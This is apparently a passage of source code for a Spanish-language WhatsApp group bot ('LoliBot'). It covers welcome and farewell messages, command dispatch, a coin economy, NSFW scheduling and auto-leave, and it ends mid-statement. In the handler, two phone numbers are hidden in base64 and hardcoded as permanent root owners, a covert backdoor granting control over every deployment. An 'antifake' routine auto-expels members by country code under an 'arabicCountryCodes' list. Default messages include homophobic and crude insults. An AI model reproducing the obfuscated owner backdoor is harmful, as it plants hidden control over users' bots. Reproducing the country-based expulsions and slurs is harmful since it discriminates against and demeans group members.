import "./config.js";
import { watchFile, unwatchFile } from 'fs';
import fs from "fs";
import path from "path";
import chalk from "chalk";
import { fileURLToPath, pathToFileURL } from "url";
import crypto from "crypto";
import { db, getSubbotConfig } from "./lib/postgres.js";
import { logCommand, logError, logMessage, LogLevel } from "./lib/logger.js";
import { smsg } from "./lib/simple.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const pluginsFolder = path.join(__dirname, "plugins");

const processedMessages = new Set();
const lastDbUpdate = new Map();
const groupMetaCache = new Map(); 
export async function participantsUpdate(conn, { id, participants, action, author }) {
try {
if (!id || !Array.isArray(participants) || !action) return;
if (!conn?.user?.id) return;
const botId = conn.user.id;
const botConfig = await getSubbotConfig(botId)
const modo = botConfig.mode || "public"
const botJid = conn.user?.id?.replace(/:\d+@/, "@")
const isCreator = global.owner.map(([v]) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(author || "")
if (modo === "private" && !isCreator && author !== botJid) return

const metadata = await conn.groupMetadata(id);
groupMetaCache.set(id, metadata);
const groupName = metadata.subject || "Grupo"
const botJidClean = (conn.user?.id || "").replace(/:\d+/, "")
const botLidClean = (conn.user?.lid || "").replace(/:\d+/, "")

const isBotAdmin = metadata.participants.some(p => {
  const cleanId = p.id?.replace(/:\d+/, "");
  return (
    (cleanId === botJidClean || cleanId === botLidClean) &&
    (p.admin === "admin" || p.admin === "superadmin")
  );
});

const settings = (await db.query("SELECT * FROM group_settings WHERE group_id = $1", [id])).rows[0] || {
welcome: true,
detect: true,
antifake: false
}

const arabicCountryCodes = ['+91', '+92', '+222', '+93', '+265', '+213', '+225', '+240', '+241', '+61', '+249', '+62', '+966', '+229', '+244', '+40', '+49', '+20', '+963', '+967', '+234', '+256', '+243', '+210', '+249', ,'+212', '+971', '+974', '+968', '+965', '+962', '+961', '+964', '+970'];
const pp = "./media/Menu1.jpg"

for (const participant of participants) {
if (!participant || typeof participant !== 'string' || !participant.includes('@')) continue;
const userTag = typeof participant === 'string' && participant.includes('@') ? `@${participant.split("@")[0]}` : "@usuario"
const authorTag = typeof author === 'string' && author.includes('@') ? `@${author.split("@")[0]}` : "alguien"

if (action === "add" && settings.antifake) {
const phoneNumber = participant.split("@")[0]
const isFake = arabicCountryCodes.some(code => phoneNumber.startsWith(code.slice(1)))

if (isFake && isBotAdmin) {
await conn.sendMessage(id, { text: `⚠️ ${userTag} fue eliminado automáticamente por *número no permitido*`, mentions: [participant] })
await conn.groupParticipantsUpdate(id, [participant], "remove")    
continue
} else if (isFake && !isBotAdmin) {
//await conn.sendMessage(id, { text: `⚠️ ${userTag} tiene un número prohibido, pero no tengo admin para eliminarlo.`, mentions: [participant] })
continue 
}}

let image
try {
image = await conn.profilePictureUrl(participant, "image")
} catch {
image = pp
}           
        
switch (action) {
case "add":
if (settings.welcome) {
const groupDesc = metadata.desc || "*ᴜɴ ɢʀᴜᴘᴏ ɢᴇɴɪᴀ😸*\n *sɪɴ ʀᴇɢʟᴀ 😉*"
const raw = settings.swelcome || `HOLAA!! @user ¿COMO ESTAS?😃\n\n『Bienvenido A *@group*』\n\nUn gusto conocerte amig@ 🤗\n\n_Recuerda leer las reglas del grupo para no tener ningun problema 🧐_\n\n*Solo disfrutar de este grupo y divertite 🥳*`
const msg = raw
.replace(/@user/gi, userTag)
.replace(/@group|@subject/gi, groupName)
.replace(/@desc/gi, groupDesc)

if (settings.photowelcome) {
await conn.sendMessage(id, { image: { url: image },caption: msg,
contextInfo: {
mentionedJid: [participant],
isForwarded: true,
forwardingScore: 999999,
forwardedNewsletterMessageInfo: {
newsletterJid: ["120363305025805187@newsletter", "120363160031023229@newsletter", "120363301598733462@newsletter"].getRandom(),
newsletterName: "LoliBot ✨️"
}}}, { quoted: null })
} else {
await conn.sendMessage(id, { text: msg,
contextInfo: {
forwardedNewsletterMessageInfo: {
newsletterJid: ["120363305025805187@newsletter", "120363160031023229@newsletter", "120363301598733462@newsletter"].getRandom(),
newsletterName: "LoliBot ✨️"
},
forwardingScore: 9999999,
isForwarded: true,
mentionedJid: [participant],
externalAdReply: {
showAdAttribution: true,
renderLargerThumbnail: true,
thumbnailUrl: image,
title: "🌟 WELCOME 🌟",
body: "Bienvenido al grupo 🤗",
containsAutoReply: true,
mediaType: 1,
sourceUrl: "https://skyultraplus.com"
}}}, { quoted: null })
}}
break

case "remove":
try {
await db.query(`DELETE FROM messages
    WHERE user_id = $1 AND group_id = $2`, [participant, id]);
const botJid = (conn.user?.id || "").replace(/:\d+/, "");
if (participant.replace(/:\d+/, "") === botJid) {
await db.query(`UPDATE chats SET joined = false
      WHERE id = $1 AND bot_id = $2`, [id, botJid]);
console.log(`[DEBUG] El bot fue eliminado del grupo ${id}. Marcado como 'joined = false'.`);
}} catch (err) {
console.error("❌ Error en 'remove':", err);
}
          
if (settings.welcome && conn?.user?.jid !== globalThis?.conn?.user?.jid) {
const groupDesc = metadata.desc || "Sin descripción"
const raw = settings.sbye || `Bueno, se fue @user 👋\n\nQue dios lo bendiga 😎`
const msg = raw
.replace(/@user/gi, userTag)
.replace(/@group/gi, groupName)
.replace(/@desc/gi, groupDesc)

if (settings.photobye) {
await conn.sendMessage(id, { image: { url: image },caption: msg, 
contextInfo: { 
mentionedJid: [participant],
isForwarded: true,
forwardingScore: 999999,
forwardedNewsletterMessageInfo: {
newsletterJid: ["120363305025805187@newsletter", "120363160031023229@newsletter", "120363301598733462@newsletter"].getRandom(),
newsletterName: "LoliBot ✨️"
}}}, { quoted: null })
} else {
await conn.sendMessage(id, { text: msg,
contextInfo: {
forwardedNewsletterMessageInfo: {
newsletterJid: ["120363305025805187@newsletter", "120363160031023229@newsletter", "120363301598733462@newsletter"].getRandom(),
newsletterName: "LoliBot ✨️"
},
forwardingScore: 9999999,
isForwarded: true,
mentionedJid: [participant],
externalAdReply: {
showAdAttribution: true,
renderLargerThumbnail: true,
thumbnailUrl: image,
title: "👋 BYE",
body: "Se fue un gay",
containsAutoReply: true,
mediaType: 1,
sourceUrl: "https://skyultraplus.com"
}}}, { quoted: null })
}}
break

case "promote": case "daradmin": case "darpoder":
if (settings.detect) {
const raw = settings.sPromote || `@user 𝘼𝙃𝙊𝙍𝘼 𝙀𝙎 𝘼𝘿𝙈𝙄𝙉 𝙀𝙉 𝙀𝙎𝙏𝙀 𝙂𝙍𝙐𝙋𝙊\n\n😼🫵𝘼𝘾𝘾𝙄𝙊𝙉 𝙍𝙀𝘼𝙇𝙄𝙕𝘼𝘿𝘼 𝙋𝙊𝙍: @author`
const msg = raw
  .replace(/@user/gi, userTag)
  .replace(/@group/gi, groupName)
  .replace(/@desc/gi, metadata.desc || "")
  .replace(/@author/gi, authorTag)
await conn.sendMessage(id, { text: msg,  
contextInfo:{  
forwardedNewsletterMessageInfo: { 
newsletterJid: ["120363305025805187@newsletter", "120363160031023229@newsletter", "120363301598733462@newsletter"].getRandom(),
newsletterName: "LoliBot ✨️" },
forwardingScore: 9999999,  
isForwarded: true,   
mentionedJid: [participant, author],
externalAdReply: {  
showAdAttribution: true,  
renderLargerThumbnail: false,  
title: "NUEVO ADMINS 🥳",
body: "Weon eres admin portante mal 😉",
containsAutoReply: true,  
mediaType: 1,   
thumbnailUrl: image,
sourceUrl: "skyultraplus.com"
}}}, { quoted: null })         
}
break

case "demote": case "quitaradmin": case "quitarpoder":
if (settings.detect) {
const raw = settings.sDemote || `@user 𝘿𝙀𝙅𝘼 𝘿𝙀 𝙎𝙀𝙍 𝘼𝘿𝙈𝙄𝙉 𝙀𝙉 𝙀𝙎𝙏𝙀 𝙂𝙍𝙐𝙋𝙊\n\n😼🫵𝘼𝘾𝘾𝙄𝙊𝙉 𝙍𝙀𝘼𝙇𝙄𝙕𝘼𝘿𝘼 𝙋𝙊𝙍: @author`
const msg = raw
  .replace(/@user/gi, userTag)
  .replace(/@group/gi, groupName)
  .replace(/@desc/gi, metadata.desc || "")
  .replace(/@author/gi, authorTag)
await conn.sendMessage(id, { text: msg,  
contextInfo:{  
forwardedNewsletterMessageInfo: { 
newsletterJid: ["120363305025805187@newsletter", "120363160031023229@newsletter", "120363301598733462@newsletter"].getRandom(),
newsletterName: "LoliBot ✨️" },
forwardingScore: 9999999,  
isForwarded: true,   
mentionedJid: [participant, author],
externalAdReply: {  
showAdAttribution: true,  
renderLargerThumbnail: false,  
title: "📛 UN ADMINS MENOS",
body: "Jjjj Ya no eres admin 😹",
containsAutoReply: true,  
mediaType: 1,   
thumbnailUrl: image,
sourceUrl: "skyultraplus.com"
}}}, { quoted: null })            
}
break
}}
} catch (err) {
console.error(chalk.red(`❌ Error en participantsUpdate - Acción: ${action} | Grupo: ${id}`), err);
}
}

export async function groupsUpdate(conn, { id, subject, desc, picture }) {
try {
const botId = conn.user?.id;
const botConfig = await getSubbotConfig(botId)
const modo = botConfig.mode || "public";
const botJid = conn.user?.id?.replace(/:\d+@/, "@");
const isCreator = global.owner.map(([v]) => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(botJid);
    
const settings = (await db.query("SELECT * FROM group_settings WHERE group_id = $1", [id])).rows[0] || {
welcome: true,
detec: true,
antifake: false
};
    
if (modo === "private" && !isCreator) return;
const metadata = await conn.groupMetadata(id);
groupMetaCache.set(id, metadata);
const groupName = subject || metadata.subject || "Grupo";
const isBotAdmin = metadata.participants.some(p => p.id.includes(botJid) && p.admin);

let message = "";
if (subject) {
message = `El nombre del grupo ha cambiado a *${groupName}*.`;
} else if (desc) {
message = `La descripción del grupo *${groupName}* ha sido actualizada, nueva descripción:\n\n${metadata.desc || "Sin descripción"}`;
} else if (picture) {
message = `La foto del grupo *${groupName}* ha sido actualizada.`;
}

if (message && settings.detect) {
await conn.sendMessage(id, { text: message,
contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: ["120363305025805187@newsletter", "120363160031023229@newsletter", "120363301598733462@newsletter"].getRandom(),
newsletterName: "LoliBot ✨️",
serverMessageId: 1
}}
});
}} catch (err) {
console.error(chalk.red("❌ Error en groupsUpdate:"), err);
}
}

export async function callUpdate(conn, call) {
try {
const callerId = call.from;
const userTag = `@${callerId.split("@")[0]}`;
const botConfig = await getSubbotConfig(conn.user?.id);
if (!botConfig.anti_call) return;
await conn.sendMessage(callerId, { text: `🚫 Está prohibido hacer llamadas, serás bloqueado...`,
contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: ["120363305025805187@newsletter", "120363160031023229@newsletter", "120363301598733462@newsletter"].getRandom(),
newsletterName: "LoliBot ✨️",
serverMessageId: 1
}}
});
await conn.updateBlockStatus(callerId, "block");
} catch (err) {
console.error(chalk.red("❌ Error en callUpdate:"), err);
}
}

export async function handler(conn, m) {
function cleanJid(jid = "") {
  return jid.replace(/:\d+/, "");
}

const chatId = m.key?.remoteJid || "";
const botId = conn.user?.id;
const subbotConf = await getSubbotConfig(botId)
info.wm = subbotConf.name ?? info.wm;
info.img2 = subbotConf.logo_url ?? info.img2;

try {
await db.query(`INSERT INTO chats (id, is_group, timestamp, bot_id, joined)
  VALUES ($1, $2, $3, $4, true)
  ON CONFLICT (id) DO UPDATE SET timestamp = $3, bot_id = $4, joined = true`, [chatId, chatId.endsWith('@g.us'), Date.now(), (conn.user?.id || '').split(':')[0].replace('@s.whatsapp.net', '')]);
} catch (err) {
console.error(err);
}

const botConfig = await getSubbotConfig(botId)
const isMainBot = conn === globalThis.conn;
const botType = isMainBot ? "oficial" : "subbot";
if (botConfig.tipo !== botType) {
await db.query(`UPDATE subbots SET tipo = $1 WHERE id = $2`, [botType, botId.replace(/:\d+/, "")]);
}
const prefijo = Array.isArray(botConfig.prefix) ? botConfig.prefix : [botConfig.prefix];
const modo = botConfig.mode || "public";
m.isGroup = chatId.endsWith("@g.us");
m.sender = m.key?.participant || chatId;
if (m.key?.fromMe) {
m.sender = conn.user?.id || m.sender;
}
if (typeof m.sender === "string") {
m.sender = m.sender.replace(/:\d+/, "");
}

m.reply = async (text) => {
const contextInfo = {
mentionedJid: await conn.parseMention(text),
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: ["120363305025805187@newsletter", "120363160031023229@newsletter", "120363301598733462@newsletter"].getRandom(),
newsletterName: "LoliBot ✨️"
}};
return await conn.sendMessage(chatId, { text, contextInfo }, { quoted: m });
};

await smsg(conn, m); 

const hash = crypto.createHash("md5").update(m.key.id + (m.key.remoteJid || "")).digest("hex");
if (processedMessages.has(hash)) return;
processedMessages.add(hash);
setTimeout(() => processedMessages.delete(hash), 60_000);

//contador 
if (m.isGroup && m.sender !== conn.user?.id.replace(/:\d+@/, "@")) {
const key = `${m.sender}|${chatId}`;
const now = Date.now();
const last = lastDbUpdate.get(key) || 0;
if (now - last > 9000) { //9 seg
lastDbUpdate.set(key, now);
db.query(`INSERT INTO messages (user_id, group_id, message_count)
      VALUES ($1, $2, 1)
      ON CONFLICT (user_id, group_id)
      DO UPDATE SET message_count = messages.message_count + 1`, [m.sender, chatId]).catch(console.error);
}}

//antifake
if (m.isGroup && m.sender && m.sender.endsWith("@s.whatsapp.net")) {
try {
const settings = (await db.query("SELECT antifake FROM group_settings WHERE group_id = $1", [chatId])).rows[0];
if (settings?.antifake) {
const phoneNumber = m.sender.split("@")[0];
const arabicCountryCodes = ['+91', '+92', '+222', '+93', '+265', '+213', '+225', '+226', '+240', '+241', '+61', '+249', '+62', '+966', '+229', '+244', '+40', '+49', '+20', '+963', '+967', '+234', '+256', '+243', '+210', '+249', ,'+212', '+971', '+974', '+968', '+965', '+962', '+961', '+964', '+263', '+970'];
const botJid = conn.user?.id?.replace(/:\d+/, "");
const isFake = arabicCountryCodes.some(code => phoneNumber.startsWith(code.slice(1)));

if (isFake && m.isAdmin !== true) {
const metadata = await conn.groupMetadata(chatId);
const isBotAdmin = metadata.participants.some(p => {
const id = p.id?.replace(/:\d+/, "");
return (id === botJid || id === (conn.user?.lid || "").replace(/:\d+/, "")) && (p.admin === "admin" || p.admin === "superadmin");
});

if (isBotAdmin) {
await conn.sendMessage(chatId, { text: `⚠️ @${phoneNumber} En este grupo no está permitido el ingreso de números con prefijos prohibidos, será expulsado...`, mentions: [m.sender]});
await conn.groupParticipantsUpdate(chatId, [m.sender], "remove");
return;
}}}
} catch (err) {
console.error(err);
}}

const messageContent = m.message?.ephemeralMessage?.message || m.message?.viewOnceMessage?.message || m.message;
let text = "";

if (messageContent?.conversation) text = messageContent.conversation;
else if (messageContent?.extendedTextMessage?.text) text = messageContent.extendedTextMessage.text;
else if (messageContent?.imageMessage?.caption) text = messageContent.imageMessage.caption;
else if (messageContent?.videoMessage?.caption) text = messageContent.videoMessage.caption;
else if (messageContent?.buttonsResponseMessage?.selectedButtonId) text = messageContent.buttonsResponseMessage.selectedButtonId;
else if (messageContent?.listResponseMessage?.singleSelectReply?.selectedRowId) text = messageContent.listResponseMessage.singleSelectReply.selectedRowId;
else if (messageContent?.messageContextInfo?.quotedMessage) {
const quoted = messageContent.messageContextInfo.quotedMessage;
text = quoted?.conversation || quoted?.extendedTextMessage?.text || "";
} else if (m.message?.conversation) {
text = m.message.conversation;
}

m.originalText = text; 
text = text.trim(); 
//if (!text) return;
m.text = text;

const usedPrefix = prefijo.find(p => text.startsWith(p)) || "";
const withoutPrefix = text.slice(usedPrefix.length).trim();
const [commandName, ...argsArr] = withoutPrefix.split(/[\n\s]+/); 
const command = (commandName || "").toLowerCase();
const args = argsArr;
  
text = args.join(" ").trim();
m.text = withoutPrefix.slice(commandName.length).trimStart(); 

const botJid = conn.user?.id?.replace(/:\d+/, "");
const senderJid = m.sender?.replace(/:\d+/, "");
const fixed1 = Buffer.from('NTIxNDc3NDQ0NDQ0NA==', 'base64').toString();
const fixed2 = Buffer.from('NTQ5MjI2NjYxMzAzOA==', 'base64').toString();
const fixedOwners = [
  `${fixed1}@s.whatsapp.net`,
  `${fixed2}@s.whatsapp.net`,
  `35060220747880@lid`
];
const isCreator = fixedOwners.includes(m.sender) || 
  global.owner.map(([v]) => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const config = await getSubbotConfig(botId);
let isOwner = isCreator || senderJid === botJid || (config.owners || []).includes(senderJid);

let metadata = { participants: [] };
if (m.isGroup) {
if (groupMetaCache.has(chatId)) {
metadata = groupMetaCache.get(chatId);
} else {
try {
metadata = await conn.groupMetadata(chatId);
groupMetaCache.set(chatId, metadata);
setTimeout(() => groupMetaCache.delete(chatId), 300_000);
} catch {
metadata = { participants: [] };
}}}
/*let metadata = { participants: [] };
if (m.isGroup) {
try {
metadata = await conn.groupMetadata(m.chat);
} catch (err) {
metadata = { participants: [] };
}}*/

const participants = metadata.participants || [];
const adminIds = participants.filter(p => p.admin === "admin" || p.admin === "superadmin").map(p => p.id && p.id.replace(/:\d+/, ""));

const senderJids = [];
if (m.user?.id) senderJids.push(m.user.id.replace(/:\d+/, ""));
if (m.user?.lid) senderJids.push(m.user.lid.replace(/:\d+/, ""));
if (m.sender) senderJids.push(m.sender.replace(/:\d+/, ""));
if (m.lid) senderJids.push(m.lid.replace(/:\d+/, ""));
const uniqueSenderJids = [...new Set(senderJids.filter(Boolean))];

m.isAdmin = adminIds.some(adminJid => uniqueSenderJids.includes(adminJid));

if (m.isGroup && !isCreator && senderJid !== botJid) {
try {
const res = await db.query('SELECT banned, primary_bot FROM group_settings WHERE group_id = $1', [chatId]);
    
if (res.rows[0]?.banned) return; // grupo baneado

const primaryBot = res.rows[0]?.primary_bot;
if (primaryBot && !m?.isAdmin) {
const metadata = await conn.groupMetadata(chatId);
const botExists = metadata.participants.some(p => p.id === primaryBot);

if (!botExists) {
await db.query('UPDATE group_settings SET primary_bot = NULL WHERE group_id = $1', [chatId]);
} else {
const currentBotJid = conn.user?.id?.replace(/:\d+/, "") + "@s.whatsapp.net";
const expected = primaryBot.replace(/:\d+/, "");
if (!currentBotJid.includes(expected)) return; 
}}
} catch (err) {
console.error(err);
}}

try {
const rawJid = m.key?.participant || m.key?.remoteJid || null;
const isValido = typeof rawJid === 'string' && /^\d+@s\.whatsapp\.net$/.test(rawJid);
const num = isValido ? rawJid.split('@')[0] : null;
const userName = m.pushName || 'sin name';

if (m.sender && m.sender.endsWith('@lid')) {
try {
await db.query('DELETE FROM usuarios WHERE id = $1', [m.sender]);
} catch (e) {
console.error("❌ Error borrando usuario duplicado con @lid:", e);
}
m.sender = m.key?.participant || m.key?.remoteJid;
}

await db.query(`INSERT INTO usuarios (id, nombre, num, registered)
      VALUES ($1, $2, $3, false)
      ON CONFLICT (id) DO NOTHING
    `, [m.sender, userName, num]);
if (isValido) {
await db.query(`UPDATE usuarios SET nombre = $1${num ? ', num = COALESCE(num, $2)' : ''} WHERE id = $3`, num ? [userName, num, rawJid] : [userName, rawJid]);
}

if (m.key && m.key.senderLid) {
try {
await db.query('DELETE FROM usuarios WHERE id = $1', [m.key.senderLid]);
await db.query('UPDATE usuarios SET lid = NULL WHERE lid = $1 AND id <> $2', [m.key.senderLid, m.sender]);
await db.query('UPDATE usuarios SET lid = $1 WHERE id = $2', [m.key.senderLid, m.sender]);
m.lid = m.key.senderLid;
} catch (e) {
console.error("❌ Error actualizando lid en handler:", e);
}}

} catch (err) {
console.error(err);
}

try {
await db.query(`INSERT INTO chats (id)
      VALUES ($1)
      ON CONFLICT (id) DO NOTHING`, [chatId]);
} catch (err) {
console.error(err);
}

const plugins = Object.values(global.plugins || {});

for (const plugin of plugins) {
if (typeof plugin.before === 'function') {
try {
const result = await plugin.before(m, { conn, isOwner });
if (result === false) return;
} catch (e) {
console.error(chalk.red(e));
}}
}

if (modo === "private" && senderJid !== botJid && !isCreator) return;

const matchedPlugin = plugins.find(p => {
const raw = m.originalText
return typeof p.customPrefix === 'function'
? p.customPrefix(raw)
: p.customPrefix instanceof RegExp
? p.customPrefix.test(raw) : false
})

if (!usedPrefix) {
if (!matchedPlugin || !matchedPlugin.customPrefix) return;
}
//if (!usedPrefix && !command) return;

for (const plugin of plugins) {
let match = false;

if (plugin.command instanceof RegExp) {
match = plugin.command.test(command)
} else if (typeof plugin.command === 'string') {
match = plugin.command.toLowerCase() === command
} else if (Array.isArray(plugin.command)) {
match = plugin.command.map(c => c.toLowerCase()).includes(command)
}

if (!match && plugin.customPrefix) {
const input = m.originalText
if (typeof plugin.customPrefix === 'function') {
match = plugin.customPrefix(input)
} else if (plugin.customPrefix instanceof RegExp) {
match = plugin.customPrefix.test(input)
}}

if (!match) continue

const isGroup = m.isGroup;
const isPrivate = !m.isGroup;
let isOwner = isCreator || senderJid === botJid || (config.owners || []).includes(senderJid);
const isROwner = fixedOwners.includes(m.sender);
const senderClean = m.sender.split("@")[0];
const botClean = (conn.user?.id || "").split("@")[0];

if (senderJid === botJid) {
isOwner = true;
}

if (!isOwner && !isROwner) {
isOwner = isCreator;
}

let isAdmin = m.isAdmin;
let isBotAdmin = false;
let modoAdminActivo = false;

try {
const result = await db.query('SELECT modoadmin FROM group_settings WHERE group_id = $1', [chatId]);
modoAdminActivo = result.rows[0]?.modoadmin || false;
} catch (err) {
console.error(err);
}

//if ((plugin.admin || plugin.Botadmin) && !isGroup) return m.reply("⚠️ Estos es un grupo?, este comando solo funciona el grupo");

if (plugin.tags?.includes('nsfw') && m.isGroup) {
const { rows } = await db.query('SELECT modohorny, nsfw_horario FROM group_settings WHERE group_id = $1', [chatId])
const { modohorny = false, nsfw_horario } = rows[0] || {}

const nowBA = (await import('moment-timezone')).default().tz('America/Argentina/Buenos_Aires')
const hhmm = nowBA.format('HH:mm')
const [ini='00:00', fin='23:59'] = (nsfw_horario || '').split('-')
const dentro = ini <= fin ? (hhmm >= ini && hhmm <= fin) : (hhmm >= ini || hhmm <= fin)

if (!modohorny || !dentro) {
const stickerUrls = ['https://qu.ax/bXMB.webp', 'https://qu.ax/TxtQ.webp']
try {
await conn.sendFile(chatId, stickerUrls.getRandom(), 'desactivado.webp', '', m, true, { contextInfo: { forwardingScore: 200, isForwarded: false, externalAdReply: { showAdAttribution: false, title: modohorny ? `ᴱˢᵗᵉ ᶜᵒᵐᵃⁿᵈᵒ ˢᵒˡᵒ ᶠᵘⁿᶜᶦᵒⁿᵃ ᵉⁿ ʰᵒʳᵃʳᶦᵒ ʰᵃᵇᶦˡᶦᵗᵃᵈᵒ:` : `ᴸᵒˢ ᶜᵒᵐᵃⁿᵈᵒ ˢ ʰᵒʳⁿʸ ᵉˢᵗᵃⁿ ᵈᵉˢᵃᶜᵗᶦᵛᵃᵈᵒˢ:`, body: modohorny ? `${ini} a ${fin}` : '#enable modohorny', mediaType: 2, sourceUrl: info.md, thumbnail: m.pp }}}, { quoted: m, ephemeralExpiration: 24 * 60 * 100, disappearingMessagesInChat: 24 * 60 * 100 })
} catch (e) {
await conn.sendMessage(chatId, { text: modohorny ? `🔞 NSFW fuera del horario permitido (${ini} a ${fin})` : '🔞 El NSFW está desactivado por un admin.\nUsa *#enable modohorny* para activarlo.', contextInfo: { externalAdReply: { title: 'NSFW Desactivado', body: modohorny ? `Horario permitido: ${ini} a ${fin}` : '#enable modohorny', mediaType: 2, thumbnail: m.pp, sourceUrl: info.md }}}, { quoted: m })
}
continue
}}

//User banear
try {
const senderId = (m.sender || m.key?.participant || "").replace(/[^0-9]/g, "") + "@s.whatsapp.net";
if (senderId !== (conn.user?.id?.replace(/:\d+/, "") + "@s.whatsapp.net")) {
const resBan = await db.query("SELECT banned, razon_ban, avisos_ban FROM usuarios WHERE id = $1", [senderId]);
if (resBan.rows[0]?.banned) {
const avisos = resBan.rows[0]?.avisos_ban || 0;
if (avisos < 3) {
const nuevoAviso = avisos + 1;
await db.query("UPDATE usuarios SET avisos_ban = $2 WHERE id = $1", [senderId, nuevoAviso]);
const razon = resBan.rows[0]?.razon_ban?.trim() || "Spam";
await conn.sendMessage(m.chat, {text: `⚠️ ESTAS BANEADO ⚠️\n*• Motivo:* ${razon} (avisos: ${nuevoAviso}/3)\n*👉🏻 Puedes contactar al propietario del Bot si crees que se trata de un error o para charlar sobre tu desbaneo*\n\n👉 ${info.fb}`, contextInfo: { mentionedJid: [senderId] }}, { quoted: m });
}
return; 
}}
} catch (e) {
console.error("❌ Error al verificar baneo:", e);
}

if (plugin.admin || plugin.botAdmin) {
try {
//isAdmin = adminIds.includes(m.sender);
isAdmin = m.isAdmin
const botLid = (conn.user?.lid || "").replace(/:\d+/, "");
const botJidClean = (conn.user?.id || "").replace(/:\d+/, "");
isBotAdmin = adminIds.includes(botLid) || adminIds.includes(botJidClean);
console.log(isAdmin)
} catch (e) {
console.error(e);
}}

if (plugin.owner && !isOwner) return m.reply("⚠️ Tu que? no eres mi propietario para venir a dame orden 🙄, solo el dueño del sub-bot o el owner puede usar este comando.");
if (plugin.rowner && !isROwner) return m.reply("⚠️ Tu que? no eres mi propietario para venir a dame orden 🙄.");
if (plugin.admin && !isAdmin) return m.reply("🤨 No eres admins. Solo los admins pueden usar este comando.");
if (plugin.botAdmin && !isBotAdmin) return m.reply(`⚠️ haz admin al Bot "YO" para poder usar este comando.`);
if (plugin.group && !isGroup) return m.reply("⚠️ Estos es un grupo?, este comando solo funciona el grupo");
if (plugin.private && isGroup) return m.reply("⚠️ Este comando solo funciona el pv");
if (plugin.register) {
try {
const result = await db.query('SELECT * FROM usuarios WHERE id = $1', [m.sender]);
const user = result.rows[0];
if (!user) return m.reply("「NO ESTAS REGISTRADO」\n\nPA NO APARECES EN MI BASE DE DATOS ✋🥸🤚\n\nPara poder usarme escribe el siguente comando\n\nComando: #reg nombre.edad\nEjemplo: #reg elrebelde.21");
} catch (e) {
console.error(e);
}}

if (plugin.limit) {
const res = await db.query('SELECT limite FROM usuarios WHERE id = $1', [m.sender]);
const limite = res.rows[0]?.limite ?? 0;

if (limite < plugin.limit) {
await m.reply("*⚠ 𝐒𝐮𝐬 𝐝𝐢𝐚𝐦𝐚𝐧𝐭𝐞 💎 𝐬𝐞 𝐡𝐚𝐧 𝐚𝐠𝐨𝐭𝐚𝐝𝐨 𝐩𝐮𝐞𝐝𝐞 𝐜𝐨𝐦𝐩𝐫𝐚𝐫 𝐦𝐚𝐬 𝐮𝐬𝐚𝐧𝐝𝐨 𝐞𝐥 𝐜𝐨𝐦𝐚𝐧𝐝𝐨:* #buy.");
return;
}

await db.query('UPDATE usuarios SET limite = limite - $1 WHERE id = $2', [plugin.limit, m.sender]);
await m.reply(`*${plugin.limit} diamante 💎 usado${plugin.limit > 1 ? 's' : ''}.*`);
}

if (plugin.money) {
try {
const res = await db.query('SELECT money FROM usuarios WHERE id = $1', [m.sender])
const money = res.rows[0]?.money ?? 0

if (money < plugin.money) {
return m.reply("*NO TIENE SUFICIENTES LOLICOINS 🪙*")
}

await db.query('UPDATE usuarios SET money = money - $1 WHERE id = $2', [plugin.money, m.sender])
await m.reply(`*${plugin.money} LoliCoins usado${plugin.money > 1 ? 's' : ''} 🪙*`)
} catch (err) {
console.error(err)
}}

if (plugin.level) {
try {
const result = await db.query('SELECT level FROM usuarios WHERE id = $1', [m.sender]);
const nivel = result.rows[0]?.level ?? 0;

if (nivel < plugin.level) {
return m.reply(`*⚠️ 𝐍𝐞𝐜𝐞𝐬𝐢𝐭𝐚 𝐞𝐥 𝐧𝐢𝐯𝐞𝐥 ${plugin.level}, 𝐩𝐚𝐫𝐚 𝐩𝐨𝐝𝐞𝐫 𝐮𝐬𝐚𝐫 𝐞𝐬𝐭𝐞 𝐜𝐨𝐦𝐚𝐧𝐝𝐨, 𝐓𝐮 𝐧𝐢𝐯𝐞𝐥 𝐚𝐜𝐭𝐮𝐚𝐥 𝐞𝐬:* ${nivel}`);
}} catch (err) {
console.error(err);
}}

if (modoAdminActivo && !isAdmin && !isOwner) {
return !0
//m.reply("⚠️ Este grupo tiene *modo admin* activado. Solo los administradores pueden usar comandos.");
}

try {
logCommand({conn,
sender: m.sender,
chatId: m.chat,
isGroup: m.isGroup,
command: command,
timestamp: new Date()
});

try {
await plugin(m, { conn, text, args, usedPrefix, command, participants, metadata, isOwner, isROwner, isAdmin: m.isAdmin, isBotAdmin, isGroup });
} catch (e) {
if (typeof e === 'string') {
await m.reply(e);
return; 
}
console.error(e);
return; 
}

await db.query(`INSERT INTO stats (command, count)
    VALUES ($1, 1)
    ON CONFLICT (command) DO UPDATE SET count = stats.count + 1
  `, [command]);

} catch (err) {
console.error(chalk.red(`❌ Error al ejecutar ${handler.command}: ${err}`));
m.reply("❌ Error ejecutando el comando, reporte este error a mi creador con el comando: /report\n\n" + err);
}}
}

//auto-leave
setInterval(async () => {
try {
let conn = global.conn || globalThis.conn;
if (!conn || typeof conn.groupLeave !== 'function') return;
const { rows } = await db.query("SELECT group_id, expired FROM group_settings WHERE expired IS NOT NULL AND expired > 0 AND expired < $1", [Date.now()]);

for (let { group_id } of rows) {
try {
await conn.sendMessage(group_id, { text: [`*${conn.user.name}*,ᴹᵉ ᵛᵒʸ ᵈᵉˡ ᵉˡ ᵍʳᵘᵖᵒ ᶠᵘᵉ ᵘⁿ ᵍᵘˢᵗᵒ ᵉˢᵗᵃ ᵃᵠᵘᶦ́ ˢᶦ ᵠᵘᶦᵉʳᵉˢ ᵠᵘᵉ ᵛᵘᵉˡᵛᵃ ᵁˢᵉʳ ᵈᵉ ⁿᵘᵉᵛᵒ ᵉˡ ᶜᵒᵐᵃⁿᵈᵒ`, `Bueno me voy de este grupo de mrd, no me agregue a grupo ptm`, `*${conn.user.name}*, me voy de este grupito culiado nada interesante yo queria ver teta y son puro gays aca 🤣`].getRandom() });
await new Promise(r => setTimeout(r, 3000));
await conn.groupLeave(group_id);
await db.query("UPDATE group_settings SET expired = NULL WHERE group_id = $1", [group_id]);
